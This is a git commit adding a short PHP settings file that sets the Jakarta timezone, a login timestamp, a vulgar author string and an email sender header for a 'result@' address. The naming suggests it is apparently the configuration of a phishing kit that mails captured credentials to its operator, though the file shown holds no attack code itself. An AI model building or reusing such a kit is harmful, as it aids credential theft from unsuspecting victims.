0931e39184ef6aaf16be9e8e689dfc4a34a7b2f5
Antonkawe <antonahmadrafi030@gmail.com>
2023-12-27 04:05:34 +0700

    Add files via upload

---
+++ system/setting.php
@@ -0,0 +1,9 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+
+$author = 'ANTON MEMEK';
+$sender = 'From: arpantek <result@arpantek.com>';
+?>
